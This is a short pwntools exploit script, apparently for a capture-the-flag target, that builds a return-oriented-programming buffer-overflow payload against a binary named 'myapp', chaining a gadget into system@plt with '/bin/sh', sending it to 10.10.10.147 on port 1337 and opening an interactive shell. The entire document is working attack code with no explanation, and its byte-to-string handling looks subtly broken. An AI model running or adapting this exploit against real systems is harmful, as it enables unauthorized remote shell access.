from pwn import *

bin = ELF("./myapp")
rop = ROP(bin)
pop = p64((rop.find_gadget(['pop r13', 'pop r14', 'pop r15', 'ret']))[0])

fun_test = p64(bin.symbols['test'])
fun_system = p64(bin.plt['system'])

payload = ""
payload += "a" * 112
payload += "/bin/sh\x00"
payload += pop.decode()
payload += fun_system.decode()
payload += "a" * 16
payload += fun_test.decode()

p = remote("10.10.10.147",1337)
p.sendline(payload)
p.sendline("\n")
p.interactive()

